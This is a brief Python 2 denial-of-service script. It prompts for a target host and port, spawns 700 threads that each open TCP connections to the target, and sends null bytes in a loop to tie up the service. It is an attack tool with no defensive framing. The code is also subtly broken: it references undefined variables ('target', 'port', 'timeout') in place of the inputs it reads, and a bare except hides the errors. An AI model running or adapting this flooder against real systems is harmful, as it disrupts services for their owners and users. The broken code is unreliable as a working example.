import socket,threading,time
u=raw_input("Target IP or URL(www.example.com):\n>")
p=input("Port:\n>")
global v
v=0
class xer(threading.Thread):
 def run(self):
  x=v
  while True:
   try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    print"[Connected to {}:{}]".format(target,port)
    while True:
     try:
      s.send("\x00")
      print"[{}: Voly sent]".format(x)
     except Exception as e:
      break
     time.sleep(.2)
   except:
    pass
   time.sleep(.3)
for x in range(700):
  v=x
  t=xer()
  t.start()
  time.sleep(.01)
